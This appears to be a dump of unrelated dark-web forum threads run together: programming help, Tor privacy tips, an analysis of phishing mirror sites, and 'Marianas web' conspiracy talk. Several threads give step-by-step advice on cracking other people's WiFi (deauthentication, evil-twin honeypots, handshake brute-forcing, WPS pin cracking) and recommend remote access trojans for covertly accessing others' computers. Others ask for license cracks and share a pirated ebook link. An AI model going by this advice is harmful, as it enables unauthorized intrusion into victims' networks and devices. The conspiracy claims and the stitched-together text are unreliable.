Does this thing even compile for you!? What's with all the weird headers you're including for no apparent reason? You're also setting yourself up to go 100% Windows-only with your code (the Sleep function is Windows-only). Is that on purpose? You're now also mixing up the use of namespaces. Either you put in a 'using' statement and forget about std:: altogether, or you don't and type std:: in front of every function you invoke from this namespace. The way you're doing it now is a major mess.What exactly do you mean when you say 'string arrays'? Just a group of strings? Have a look at std::vector and std::string for that.#include <iostream>#include <string>#include <vector>int main() {  std::string firstSentence = "This is my first string.";  std::string secondSentence = "This is my second string.";  std::vector <std::string> stringArray; //Define a vector called stringArray that will hold std::string objects  stringArray.push_back(firstSentence); //stringArray's push_back method places a std::string into the vector.  stringArray.push_back(secondSentenc);  std::cout << stringArray[0] << std::endl; //Outputs firstSentence, index location 0  std::cout << stringArray[1] << std::endl; //Outputs secondSentenc, index location 1  return ( 0 );}I deliberately did this example in a way that introduces *ONLY* the concepts of std::string and a std::vector to contain them. The way it reads and writes to the vector is *NOT* by the book but I didn't want to introduce too many new constructs in one example. Also, you don't really need to create the firstSentence and secondSentence std::string variables. You could just add a line of text to this vector by doing:stringArray.push_back("God shave the Queen.. please!");..but then you'd miss that the std::string object gracefully accepts a const char* and converts it to a std::string for you on the fly. Very useful to have happening, but it's essential that you're conscious of the fact that C++ performs a bit of "magic" behind the scenes for you here. You should never rely on this behaviour because a const char* is completely different from a std::string in a technical sense.What resource are you using to guide you as you're learning? Seems to me it's all over the place, mostly learning C-isms that work against the way C++ was designed. There are very books around, which can be had for free online. I'll post a few titles here later.PS. I just wrinte int main() because I'm not going to use any command line arguments anyway so no need to expose to allocate any memory for them.
Here's a good collection of C++ information for you.Clearnet Magnet URI:magnet:?xt=urn:btih:30F17EE2888E71583CC8DBAD09290728893343E4&dn=c+programming+ebooks+collection+r+ju+wbrg&tr=udp%3A%2F%2Fopen.demonii.com%3A1337%2Fannounce
Thanks for all the help. First of all the code does compile, although I could make the brackets and indentations a bit neater. As for the 'weird headers', the program is not finished and they will be used. I am going to go for Windows only for the time being (unless this is a bad idea?). Unfortunately I don't really know where to look for the information on C++, I have some books on it but they all seem to use different functions etc. The book I using does not even mention some of the functions you talked about (it was for beginners). Could you explain rounding errors in more detail and recommend the order of books I should read (from your link). I think I have picked the wrong book to use, it keeps trying to get me to program in a procedural way, instead of OO. Finally how do I link C++ files to each other?
Tip: don't ever include or even write any code you won't immediately be using.Going platform-specific is always a bad idea if you ask me, but opinions vary. Don't just trust me on this, maybe someone else could weigh in.Rounding errors come from using int, a fairly imprecise type if you're doing more than just addition, substration and multiplication. Try doing this:#include <iostream>int main() {  int numberOne = 5;  int numberTwo = 9;  std::cout << numberTwo / numberOne << std::endl;  std::cin.ignore();  return (0);}That'd return 1 as the outcome of 9/5 because int doesn't have high enough precision and just chops off the decimal from 1.8, leaving you an incorrect 1. Replace the ints with doubles and see what it does. When using double instead of int you'll have the opportunity to round your numbers in a mathematically correct way before possible converting them back to int.I'll get back to you on the books. It's been a while but I'll look into it for you.Linking files together is done differently by each development environment, most automate the process for you which is fine for now but not very portable. I'm on UNIX myself where Makefiles are used for this. Have a look at CMake for a cross-platform Makefile generator. Note that this subject is probably a bit beyond your reach at this point in time though, so don't sweat it if you can't yet make heads or tails of it.
Hi intelsjust wondering which of these two programming languages suites best for future use on hacking field?I know both of 'em are strong n really useful but what im thinkin about is that since most of the servers run unix, C# might bit more useful..thnx in advancedsntXst
Depends on what the tools are meant for, the distro you are using, how much security you want, how much time you can put into the said project.C# has bubble events, if I'm not incorrect, so if you want a gui, use C#I've heard C++ is better for command line, but never seen any actual proof, so I highly doubt it is. I don't specialize C language, but I hope this provides at least some information for you :)
Preferably a programming language that does not include garbage collection (C#/Java both are implemented with automatic garbage collection).
C++ hands down.
C++ runs without a runtime in between, straight on the metal. That's a big plus for most kinds of hacking. C# effectively limits you to Windows only, which is a small minority of connected devices out there.
even though this is dasnotexist post, what about python. there are some books as to why it is useful for hacking, but what do you guys think?
No, requires a runtime that's huge and rarely present already on targets.
You could use it to quickly write exploits, but you won't be able to inject python code into an executable...
I am a serious beginner when it comes to linux Operaring systems. I mainly try to use Kali or even TAILS, I just can never seem to get things configured properly for my computer. For example, I have difficulty with Tar balls and even the basic shell commands. Even if you choose not to explain in this forum could I get good beginner links so I can do the research?
Try installing Ubuntu somewhere. That's about the most beginner-friendly Linux out there with huge forums and community support behind it. Start from there. Kali and Tails aren't aimed at Linux beginners so it'll be much harder to get 'n00b' questions answered.
 
Sorry to let your dreams down man but such thing is quite impossible nowadays
Even contact less credit cards? Given the known vulnerabilities surely someone could scan them using a signal booster, like when they make people call premium rate numbers by hacking their phones Bluetooth.
  I am trying to do my due diligence with learning as much as I can about security before allowing the internet to touch a new (and not yet purchased) desk top.   The concern that I have is more or less related to information-overload at this point. I've seen countless youtube videos, read many articles and listened to lots of podcasts about this over the last few months.  I am open to suggestion in terms of what protocols to follow, programs, apps, methodology, books to read, etc.  If there are any outstanding youtube (or where-ever) videos that you'd recommend, please don't hesitate to mention them here. If I've seen it, I'll rewatch it.     My thought process on this is mostly as follows:  I want to basically sandbox everything that touches the internet right from the beginning.  Anything that I download, ie; Firefox, will be brought down via another computer, scanned for virus, saved to USB, and run sandboxed on the new processor. I value privacy, anonymity and security over how long it might take to fire up my browser, etc. I routinely use such things as adblock plus, better privacy (for LSOs), default browser = startpage.com and not having a single google-related account.   I'm not trying to be spoon-fed here, so you don't need to spell anything out, just point me in the right direction and I'll learn it on my own.  (I just don't see the point of using a thing without having at least a basic understanding of it first.)   I am not in a big rush to buy this processor, but I'm planning on it in the next few weeks.  Even then, I won't take it out of the box until I have a solid plan.        Thank you in advance for taking the time to read this!  F.T.W.
Try Whonix OS I think you're gonna love it. It's got a wiki, google it and you'gonna find all the answers you need.
You are absolutely right.  Thank you.
I have the same question, but I prefer a windows style based OS is there one that can suit my needs for my New Gaming Laptop. That I will Undoubtedly use for my Undernet needs as well.
@Kumont: assuming you have serious privacy/security needs, burn a CD of the Tails OS and boot from that whenever you visit the deep web. It won't touch your Windows OS (which, if you ask me, is in itself unfit for this purpose) and it'll be secure. Restart your system and you'll be back in your regular Windows-land again.
 
blog.torproject.org said:The Tor Project has learned that there may be an attempt to incapacitate our network in the next few days through the seizure of specialized servers in the network called directory authorities. (Directory authorities help Tor clients learn the list of relays that make up the Tor network.) We are taking steps now to ensure the safety of our users, and our system is already built to be redundant so that users maintain anonymity even if the network is attacked. Tor remains safe to use.Source: https://blog.torproject.org/blog/possible-upcoming-attempts-disable-tor-network
nice find
 
You have a lot to learn. You won't find the answers on IE and not many are that keen on sharing their knowledge. Using tor for carding is an act of utter futility. 
use i2p
 
That goes against the philosophy of the Intel Exchange, if you wish to create your own Closed Shell Network, feel free, but the Intel Exchange is meant to be an open network.Anyways, I doubt that anyone with Linux/BSD/anything that's not Windows will be blue screened, unless whatever this "hack" does is directly to the hardware.That's an interesting idea about Closed Shell networks though, if things like that became popular security among certain cliques would be heightened.For the people who want to be in a Closed Shell network, of course.
Oh sorry for violating your policy I also agree with free access but it is nice when there are some palces fed free
Would be nice to visit marianas web :) I approve! @nobody_here_01I agree with Kazuya, this shouldn't be restricted so please remove this e-mail adress@KazuyaThe virus could just render on the screen, like any other normal program. Also remember that hardware backdoors are not that unrealistic, as NSA placed a microcontroller inside the CPU which can be controlled from the 3G network.
@the3coderIt will not be restricted, but why must i remove email address? It is for people to communicate directly if they have something to say that they don't want the whole world seeing.
If Marinas is Level 7, what is Level 8 (the supposed final level of the Internet)?I heard it was called Deadweb because, well, you die if you go on there (usually death sentence through legal system) due to the unspeakable content on there.
@nobody_here_01Not everyone here understands the risk of the "deeper web".So don't sweat it to much.I look forward to discussing theory with you between our two threads.Consider me your first applicant....Sincerely,Gunner Zodiac Russtle  
Its kind of all true execept step 4,since you wont get trolled with that dog picture,they will actually send to kill you.
@fabricoHow would you know? Have you been attacked recently? Just pointing out nobody can really know without being there. 
This whole "8 levels of the internet" sounds a lot like Buddhism's "18 levels of hell".
I beleive the internet is closer to my version of heaven. No censorship (on darkweb I mean) freedom of speech. Freedom in everything
Is there only "one" marianas web? I mean, when it is a closed shell system and only a few people have access to it, and it requires you being in the same room as them, why can't there be a couple of marianas webs? There is a possibility, why can't a group of people create their own marianas web?
You said in step 1 there are some criteria to be met. What are they?
for the sake of arguement let's say we do hack in to the marianas web. Then what?wouldn't they know that another person is in their network? can't they just leave?(or is hacking in the way into the marianas web?).
@UnunoctiumThe commonly accepted theory is that level 5 is just AI...The story goes in the early 2000's a hacker hacked this Spaniards computer,looking four a rumored software that makes it impossible for you to be traced...Needless to say he got a bit more then he bargained for... I am writing a paper on the "deeper web"I have four years of research behind me for this.In doing so I hope to gain the interest of others in this said network,to solve this mystery once and for all...If you are interested in the subject here's a good link:http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=1381@nobody_here_01Would you be interested in coauthoring that paper with me?SiNcErElY,GuNnEr ZoDiAc RuSsTlE 
@gunnerzz,@nobody_here_01: Would you guys allow me to join/watch/read? I'd love to learn from you guys.
@Nobody:I have contacts,lets let it stay to that info.
@fabricoOh I see how it is...EVERYONE GIVE HIM HELL FOR NOT TELLING US SOMETHING!!!!You people always seem to do that to me...-_-
@gunnerzz:Do what?
A lot of those theories seem more like beating a video game than accessing a closed internet. I also couldn't understand what these .clos people would be so interested in hiding, unless it's actually the president himself. (Or Tupac lol) what would they be holding secret?

Tor on iphone is the worst idea ever...
I question it sometimes but as long as you keep the software updated, I feel its pretty safe.
@fabricoNothing going off on the wrong person...@BumblefootThe "best enemy" made it like that.There is a reason some computer experiments are better done OFFLINE.(Hint Hint)If you figure it out don't say anything there are bad "people" watching...
@gunnerzzEmail please?I am wanting to work with you on several things and I would love to co-author a paper with you, I will be back on Monday at the latest and then we can chat via IRC or email. Let me knowRegardsNobody_here
While on the new hidden wiki I clicked on that "Mysterious" link and a picture of a girl with blood in her eyes poped up and there was a box for a password. That sounds like the bloody dog thing.
There are ties to that site and the "deeper-web",not sure what...Or why...Or who...The Spaniard supposedly made that sitestrange rummer a friend of mine told that he got it from a IRC.(Never going to find who it was a guest chat thing it was a message for me.Yes that scared me little....)
Where better to hide a portal than right in the open.And it's defiantly got the look, (scared the shit out of me) I'll research it more if possible
Okay let me know what you find...
Yeah, the "Mysterious" link has a video on it of people getting axed and murdered. Quite sure it's real...It then says "ONE, TWO, DEVIL'S COMING FOR YOU... THREE, FOUR,, BETTER LOCK YOUR DOOR". 
Ahhh....Good old tor sometimes more graphic then the best horror movies....-___-
Umm, where can that "Mysterious" link be found? 
Oh my! I just clicked that "Mysterious" link on The Hidden Wiki. There are some terrible pictures in there. It freaked the crap out of me. 
Below the "Mysterious" link, there some link called Illuminati or something. if you notice correctly, there is a video on the main page of that "Mysterious" site, the same video is on the "Visitors" page in the "Illuminati" site. Is there a possibility that both the sites are connected? 
Bumblefoot, you mentioned you would research it some more. Have you found anything? And if anyone gets some more info, let us know please! 
I have had little luck finding anything about it. Other forums have banned me after I even mentioned it. I feel like it could just be a hoax, but the thing that throws me off is that there's no "sign up" or way to crate an account. Which means the only way to get a password is from an outside source. 
Marianas web is AI!!!!http://www.learning-mind.com/five-creepiest-advances-in-artificial-intelligence/Look at what the other stuff on that list is doing!!!!You expect me to believe that the only one on that list connected to the internet has a CAT fetish??That is Marianas web!!DAME YOU GOOGLE!!!!!!!Sincerely,(The excited)Gunner Zodiac Russtle 
Im sory gunnerzz that is not Marianas web.
That's not the point.The point is advanced AI is connected to the internet.Not all of the fixate on cats.Some a (literally) insane...PLEASE CALL ME Gunner
Ok I will call you Gunner :)
Yea the zz are there just so I can have a username...
@nobody_here_01I have great interest in your project, count with me.I need your tor mailOut
If it's a closed shell, wouldn't there not be any nodes or bridges connecting to the deepweb? You'd have to physically be at a machine connected to access it...If it really housed an AI, I'd bet it would be for the purpose of 'teaching' it, similar to the Corewar warrior trainers. I think it'd be neat if it were just a huge Corewar core... think of the size of the programs you could make if you had more than one core to use!
How would you set up a secret worldwide network, ie, another internet?  What options would be ideal?  A separate system with its own hardware/infrastructure?  An advanced system of software and/or coding?  Both?  Would it be something similar to TOR?
Might want to join this discussion: Alternative Internet.
Thanks korruptor
 
I think you may need to buy a VPN first, try anonymousVPNs.com and then lifetimebooter.com
Hello guys, I was just wondering if you remember remailers like Mixmaster or Omnimix? I haven't used them for a while. What are your thoughts about them? Are they still secure or are you using them? Or has it become senseless since we have anonymous email?Recently I discovered a site called "Globfone" offering free calls and text messages. I just feel strange using this site. I mean they are offering this for FREE and saying that they are just financing themselves with advertisement. So are they selling all the metadata or what do they do with the numbers? If you know a program with which I can call encrypted or anonymous also mobile phones please let me know. 
This may be a dangerous topic to discus but does anyone know decent ratting software, or any other ways to gain third party access to a persons personal computer. I have no bad intentions I was just curious. And don't try to rat me okay, we're all on the same team. 
Ahh those things.. I remember using those when I thought I was a l33t hAx0r.I don't know any current RAT software, you'll have to look it up on google.
In all seriousness, DarkComet may not have any recent updates but it is just as functional as blackshades or any other.
What about cell phones can those be ratted at all or is that a completely different program?
@SoldierBoy I though both darkcomet and black shades got shut down.
Just bumping this up because I also need to find this type of software.IMAG
Found A Really well working rat it is called NetWire you can get a trial from this link. http://www.worldwiredlabs.com/netwire_/It is quite pricey but I found it is the best working rat that u can buy/download. Already looked for licence generators couldent find any if you manage to do so pls pm me. It can do anything a normal rat would plus has a built in proxy.IMAG
Anyone know of a place to pickup DarkComet?  The original site is down and so far no luck finding it on my own. 
Hi I'm trying to create array of random numbers on javascript. What I've accomplished so far is:1- Create a function for generating random number array2- Create a function for displaying the indexed values of the array on the canvas(HTML5)The problem though, is that the array genarates duplicated values, does anyone know how can I create an array of random numbers without duplicates and display that on the canvas?Note that Im using my code on jsfiddle.net to test it, Thats my code://=============HTML FILE===============<canvas id="canvas" width=600 height=600></canvas>//=============JAVASCRIPT FILE=========function randomNums(arr, max) {     for (var i = 0; i <= arr.length; i++) {         arr[i] = Math.floor(Math.random() * max + 1);    }    console.log(arr);    return arr;}var numX = 0; var numY = 0; function fillArrayRandomNumbers(arr, max) {    for (var i = 0; i < arr.length; i++) {        arr[i] = Math.floor(Math.random() * max + 1);    }    console.log(arr)    return arr;}function displayArray(arr) {    canvas = document.getElementById("canvas")    var context = canvas.getContext("2d")    context.font = "30px Georgia";    console.log(arr.length)    for (var i = 0; i < arr.length; i++) {        console.log(arr[i]);        context.fillText(arr[i], i * 120, 150); //fill text of arr[i] and where to draw(x,y)    }}
function fillArrayRandomNumbers(arr, max) {    if(arr.length < max) {        return null;    }    var existing = false;    var temp = 0;    for (var i = 0; i < arr.length; i++) {       existing = false;       temp = Math.floor(Math.random() * max + 1);       for(var j = 0; j < i; j++) {           if(arr[i] == arr[j]) {               existing = true;           }       }       if(!existing) {           arr[i] = temp;       }    }    console.log(arr)    return arr;}The function now returns null if arr.length < max, because then it's impossible that there are no duplicates.Good luck :)
thanks a lot for your answer, I appreciate it.
 
Hi all,I need some advice. I've created a new vendor site and I'm having trouble with the BTC integration. I can't use bitpay as it leaks info. Coinbase is a pig. Any ideas on any e-comm platforms I can use with vendor site on onion?thanksG
Hell I have yet to find any programs that can help me get the passwords to all the wifi in my area? 
There are a lot of ways, but I used Backtrack with Airmon-ng. Just look up some tutorials on Youtube for hacking wifi with Backtrack (new version is Kali). You'll need a wifi card that supports this type of behavior, so that might be $20 on Amazon. 
I torrented a PDF called Kali Linux Cookbook with the intentions of learning to be Kali savvy over break. Didn't happen, but I know there's some info on using airmon-ng in there. Or just google kali wifi for a million billion tutorials.
I know this is old, but I found this tool quite useful: https://code.google.com/p/fern-wifi-cracker/
aircrack-ng is another one
Depends on the encryption of the wifi. If it's WEP, then its generally fairly easy to crack using Aircrack-ng. However, WPA/WPA2 two will need to be forced with the following methods, these are just a few to keep in mind:-The evil twin method: Launch a DOS (via De-auth requests) against one of the registered computers on the targeted wifi network, forcing the user to be disconnected. From there, set up your own little honeypot with the same ESSID & BSSID as the other wifi network and try to effectively trick the person to try logging in to your connection. At that point you'll see the password that was entered through the other computer's attempted access. From there you could alse allow the user on and let the honey-potting begin! :) -Bruteforce via Aircrack-ng by capturing a WPA/WPA2 handshake from the targeted wifi by de-authing a user on the network, and then waiting for the re-connection reply sent. From there take the capture file, and crack the password via wordlist or Charlist. (Takes the most time, however more likely to have success if you have enough patience to wait that long for results.)-WPS-PSK pin cracking - basically trying random combinations of pin numbers until the right one is found. A good program for this is REAVER, if you don't want to do it manually.These are common methods; however, there are many more.*EDIT-To perform these attacks I recommend the Aircrack-ng package and Wireshark programs.
Use Dsploit, aircrack-ng 411 (kali linux), create a network map, then use bluejack to get cold-storage passwords for WEP, or WPA enterprise.If it's as simple as WPA, WPA-2, you can use airmon-ng.If you're really, really good, you can do the same as me, & load all these items into a phone.It requires a rooting, which may take a few hours, but considering phones have AWFUL antennas for wifi listening, don't expect to get much information without using a bluejacking.(bluetooth jacking), and you can steal photos, text documents, phone names, contact names, anything in the notes, and other items. Hope this helps! :)
REDACTED, does the person have to have bluetooth on for this to work? Or do you just have to be on the same wifi as them?
On of course. Unless you have a RAT installed on their phone. Thoron.
Is it possible for someone to give a detailed steps on how to use aircrack-ng  on Windows they mentioned something og making own DLL links have no idea what that means. Or a WiFi cracker for windows OSThanks in advance
Hmm whitetiger1000 you are honestly way better off on a linux based os rather than on windows when it comes to cracking security. But sure if I have more time I will do that for you. I have to warn you though that is going to be like at the end of this week, since I don't have much time at the moment. Thoron.
@thoron: I'm not in hurry you can take your time. I have a lot of Linux OS but mostly use them on VM wanted to to make Ubuntu my defaukt OS but I never get the chance to just say Fuckit today I'm removing windows lol. what linux OS do you suggest I run as my Default when I do eventually decide to make it my default OS or probably a partition. 
Try to get a old copy of backtrack 5 dont use that kali bullshit it's bad IMO.
Offensive Security Wireless Attack has a lot of interesting material.
Yeah, Thoron's right.I run a highly modified Arch Linux, and a VM on my phone.Have amazing security, while being able to lash through others.Although, I like to stay to web browser hacking, as a server cannont exist without a client, and a client has no purpose without a server, so, the race is forever ongoing.Hope this thread helped you, and good luck, fellow blackhat. :)
@thoron:  Noob quetions. Got me Backtrack 5 R3 read something about having a USB wireless adapter. I'm planning on doing a partition on my PC will backtrack detect my NIC(Network Interface Card) or will I still have to buy a USB network adapter?
@whitetiger1000 it still will, but those USB network adapters just boost your performance better. Let me put it this way: you can tackle more things at the same time. It's just a performance thing. If you are willing to get an adapter then it's up to you. Personally I would do it. It's what 50 dollars for a good adapter? Anyway like I said it's up to you.
@thoron:  I'd love to get me that adapter but where I'm from they don't sell it here :( and i have no means of ordering from ebay or where ever. I guess I'll have to work with what I have. Thank you
Foolproof methods:~Hold a loaded gun to the homeowners head and ask for the wifi password.Less foolproof but almost there:~Wait until he is gone, go into his house, get on his PC.Follow the instructions from superuser to show the characaters of the WIFI password assuming his computer is connected to it:"In the computer that can connect to the network, type Manage wireless networks into the start menu search. Right click on the properties for the network you want and click Properties. In the security tab you should see an option to Show characters.This will reveal your WiFi password that computer remembers."source: https://superuser.com/questions/424624/is-the-wifi-password-stored-somewhere-in-windows-7I haven't tested this myself, but it seems like it would work.Difficult:~Use a program like Aircrack-ng, or attempt to hack the router.CONCLUSION: These methods take serious effort or risk, and the reality is that it just makes more sense to pay a few dollars a month for a portable wifi hotspot (about the same cost per month as a burner phone), get the service from an ISP that price gouges your area, or to go to the nearest cheap hotel and sit in the parking lot. If it was so easy, everyone would do it.
What are the tools and programs I need to get secure on Deep Web??
I assume that you are using the Tor Browser Bundle right now, to be "secure" you should disable Javascript and any other plug-ins, you do that by clicking the "S" besides the Tor onion in your browser, that "S" is NoScript, a Add-on for Firefox.When you have clicked it, click "Forbid Scripts Globally (advised)", that will make sure no website you visit can run scripts, which may be used to uncover your IP or other terrible things.You could use Tails which is a Operating System designed to direct all your internet traffic through Tor, you can use it in a Virtual Machine but it is probably best if you burn it to a DVD or USB.Other than that, don't be stupid, don't say or do anything that could reveal your real identify, don't use nicknames, passwords or anything else that you've used on the clearnet which then could be used to identify you.
There is also Whonix that runs on a Virtual Machine.IMO, do not use Tor on a main OS (Windows or Mac, especially). Tails in a Live Pen or DVD is the easiest and, perhaps, the safest way to surf the Deep Web.But none of this make sense if are you are not carefull and leave hints of who you are here and there. Remember, the three letters agencies are VERY good on profiling. And for the fact that you have visited Tor/Freenet/i2p/Tails/Whonix (whatever) in clearweb you (we) ARE already in their special list (not joking here).
@smst @ltdThanks guys! I will download Tails the problem is I'm worried with NSA having my ip on their list as I don't know what they can do with it or if should get worried with that. And by the way I got a question: The protection tor provides is good enough to hide my ip or should I use a proxy? And if I should, how I could do that?
Well, for now they won't do anything, but all of those who have visited any kind of anonymization software website are under their surveillance, perhaps, to keep close eyes on us.Any additional security to Tor would be something that would prevent your ISP from seeing that you are using Tor - they can see that you're using it but not what you are doing.
Is it possible to change the operating system of a blackberry playbook ??
What the title says I have an IP what can I do with it?
This should be enough to start...http://intelwikibk5ur62.onion/doku.php?id=intelwiki:onionland:ipSee the section "Different types of IPs or: what an IP tells me about you"From an IP you can basically find the rough location of the owner of the IP, their provider and sometimes some more stuff...Remember that this is only useful as long as the IP you received was not the one from a proxy...

I was aware of the Hidden Wiki duplicate, didn't know this was a larger scale thing. Thanks for posting this. I will keep an eye out for more. Update:Compared the links on the two hidden wiki's... Pretty much everything is mirrored, even all the "Financial services", drug markets, everything. Many duplicates, especially the high profile ones, have the first and last three characters identical to the original onion. Interesting. Update 2:Intel Exchange duplicate: http://z7d7gx53ne7fouyf.onion
If these are duplicate sites in order to retrieve your information, it's not really a MITM attack; it's more like phishing. Regardless, can anyone think of a way to combat this? We could have a list here in a post that we maintain, but that wouldn't stop a new user from making their own fraudulent additions/removals. 
It appears to me as though someone copied the Hidden Wiki, and then copied every site it linked to. Step one is check to see if your bookmarks have become contaminated at any point. If we are going to maintain a list ourselves maybe we should set something up where for every service you can list several onions, original is marked, duplicates are listed below?Just for reference:Real Wiki: http://zqktlwi4fecvo6ri.onionFake Wiki: http://zqkth3uimqxgl6ri.onion(Just check the URL to Intel Exchange and see for yourself)
The fake one has been trying to load for several minutes. That makes me wonder if someone is doing a DDOS to keep people from using it, which would be awesome. I like your idea. We can have a categorized master list of legitimate sites while also listing fraudulent ones beneath. Just tried signing up for the bogus Intel Exchange with a new username. User registration doesn't work, as well as login. It appears that they've scraped everything rather than getting the server-side code. People trying to use these bogus sites won't be able to login. But that doesn't matter; because by the time the user knows the site is not the real one, their credentials are already compromised. 
Another funny thing I just noticed: sites which have been mirrored have had their public Bitcoin addresses replaced as well. So I think we can rule out any legitimate purpose of these mirrors at this point. I was comparing the Onion Dir as referred to by both Wiki's. Original onion: http://auutwvpt2zktxwng.onionOriginal bitcoin address: 12AsXYFQHoaFNQqS1Et39Z4YvZMkN2gXwaDuplicate onion: http://cyc6t7lrkrpm5itu.onionDuplicate bitcoin address: 1Pce7JABJg1oNaPUbQaATLbE8g15Mx6oEGFurthermore, many (not all) of the URLs listed on the Onion Dir have been replaced as well. I'm not sure whether someone is hosting copies of all the sites elsewhere, or they are just replacing the content as they pass it along, but something fishy is up for sure. Update:Original URSSMail: http://f3ljvgyyujmnfhvi.onionOriginal bitcoin address: 19uHNPBuYJkKsZDaBDaEPLEd8JqwHFNzcWDuplicate URSSMail: http://j3i7qdc2h4dpnr6l.onionDuplicate bitcoin address: 1CBq78kMaz9yC3qTTN1qvvVW1dEvgyXXECGo to donation page for the addresses. The Litecoin address has not changed. 
Also the reason the mirrors are so slow compared to the original is probably because:Original situation:You  <-->  Tor  <-->  Original ServerDuplicate situation:You  <-->  Tor  <-->  Duplicate Server  <-->  Tor  <-->  Original Server
Interesting. So it's a new kind of MITM attack. This means they're building content on the fly, which takes a lot of server horsepower. And I agree. Changing the BitCoin donation address likely does rule out any law enforcement or "legitimate" mirroring of these sites. We need to tank these servers so the hosts drop these assholes as a customer. 
I'll keep the first post updated with all your addition and will also post new intels at galaxy.
Anybody up for a game of Follow the Money?
Being new to dark web and crypto-currency, I can't tell if that's a real question or a facetious one. 
Well, in principle every transaction made by every Bitcoin address is visible to everybody. Not that there aren't any methods to get around this, but it was definitely a real question. Also, my previous post was instantly visible on the duplicate onion of Intel Exchange. So they are definitely building the content on the fly. 
@fnord:When it is duplicated like this, wouldn't the duplicate server just send the credits from the browser to the original site? That wouldn't be much more complicated than having a script mirror everything.Another important question: If they're phishing users, why? If they don't provide a login/register function people will soon stop using it. But what is the point of getting the credentials? If they want to login and wipe all posts, they can do that but some people surely have this mirrored and just repost it in a new thread, so what are they gonna do with them? Another possibility is "they" found a way to find your real IP or found an exploit...Now what can we do about it? More important: How are we making sure that new users don't follow one of the clones but the original sites? Tor gains users, and if the first visit they do is on the fake hidden wiki, then they'll spend their time on fake sites. That really is the worst case scenario...@Intel Exchange adminsSSL/TLS with Perfect Forward Secrecy would be a good start...
@the3coderWhile the content is being built on the fly, the BitCoin addresses are being altered. Other addresses are being injected instead. Login functionality may work for some of the black market sites, which would be far more profitable than Intel Exchange for them. This is just the only one I checked. 
@the3coder:See the post I made a minute before yours: they are forwarding the request to the original server, change certain parts of the content (onions and bitcoin addresses), then forward the modified content back to the user. As to why: credentials, money, active targeting, disinformation?For hidden service admins I would suggest displaying the real onion address of your service in such a way it can't easily be replaced by an automated script (display it as an image file maybe). As long as the content is still being actively forwarded users will see the official onion address when visiting a page and can compare it with what they see in their address bar. 
That's a good idea @fnord. There should be an image embedded toward the top of the site that has text saying something like "The URL above should look like this: http://rrcc5uuudhh4oz3c.onion." The jpg name and code could change periodically so that they can't fix it once and have it stick. Good thinking! 
So protection measures would be:- SSL/TLS- PFSWe don't know how powerful this hoster is. Can he sign a certificate when we can't? If yes, that could have a negative effect: Users trusting the one with the certificate instead of this site...- Image/Banner telling the site.The problem is that there are rarely images in posts, so it is easy to filter out and replace. Even if the WHOLE PAGE was rendered as image, it would be possible to filter & replace it by special programs...
Anything you put up can be filtered or replaced on the duplicate onion. That's the whole problem. I do think using images would solve the problem at least on the short term, simply because how the attack is configured now is to do a simple text search&replace. Doing things like putting up images or HTML-encoding your onion address somewhere will probably work for now. As long as it differs from the known patterns it will get through. However I have no idea how persistent this attack will be, or who is behind it. In theory, given enough resources and motivation, the Tor network could be split into a real and fake network, completely identical to each other except in onion addresses (and Bitcoin addresses, apparently). If you have the bad luck to get into the fake network you won't be able to get out unless someone provides a good onion through the clearnet or other means. Clearly this would be problematic. Any ideas on what could be done against such a system?
Well, this sounds fun.If things like bitcoin addresses are being changed, simply follow the money, follow that bitcoin address and find it's origin, you'll probably find a person or a group behind it..And yes, this seems to be a phishing attempt too, if someone like I or Mr-Tape were to log into that fake Intel Exchange, theoretically all posts could be scrapped, which is something no one without an anti-intel exchange agenda wants..It could also be for power, they could manipulate information posted by users and twist things, thus fucking up the entire point of the Intel Exchange.Mr-Tape, if you're reading this, even though I'm sure you already do.. It may be advisable to make periodic backups, in case some fluke happens to either you or I. (Which it probably won't, but it's good to be prepared, right?)I don't suppose this could be a cointelpro-related operation, could it?
Backups of the database are saved frequently.I doubt this is something special, it's probably just mirrors to help maintain information just in case; the fact that the Bitcoin addresses are changed doesn't surprise me, many people crave for money and/or drug funds.

Oh, hey Korruptor, long time no see.I see, makes sense, I'd still be extra careful with these fake sites, though.
I've been following this topic since I got here. Still no ideas on how to make sure new users land on the real sites? The New Tor Dir with link rating can be mirrored just as well.I think it would require a trustable, non-editable source at a clearnet address.
^Moved above^
Has anyone checked if the forwarded requests use different Tor identities or if they come from a single exit node? It might be a way to identify a signature and at least stall whatever they're doing.
*Updated*
The noreason mirroring server (http://fkyvwpu7ccsorke2.onion) seems to be down, I hope it'll be back up soon...
Hi, I experimented with the mirror of Onion Dir, they only replace some strings and set a PHPSESSID, but the PHPSESSID is only set on the main page, not on f.php. If you want to find out more you may look at http://auutwvpt2zktxwng.onion/f.php and the duplicate. You should know that the duplicate is cached.Original onion: http://auutwvpt2zktxwng.onionDuplicate onion: http://cyc6t7lrkrpm5itu.onionHere my first result:Scam:Connection: keep-aliveAccept-Encoding: gzip, deflateCookie: PHPSESSID=926cjbrt0usteknadtq67v6rj2Accept: */*User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0Host: cyc6t7lrkrpm5itu.onionOriginal:Connection: keep-aliveAccept-Encoding: gzip, deflateAccept-Language: en-us,en;q=0.5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0Host: auutwvpt2zktxwng.onionI tryed to filter by host, but cyc6t7lrkrpm5itu is only displayed because of string replacement, they don't send it. Do you have any idea how to prevent them from copying sites? Their fingerprint is too weak, I dont want to filter because of Accept: */* or something similar.
Interesting... Unfortunately this won't help filtering the sites... Could you test some onion URLs to see which ones are actually substituted? We could build a complete blacklist from that.
Maybe we can use this: http://skunksworkedp2cg.onion/sites.html . At the moment I dont have the time to write a good spider bot for testing, unfortunely in many http librarys the usage of socks proxys isn't possible.
@anno006: The list in the first post contains the fake mirrors, updated to about two weeks or so ago.
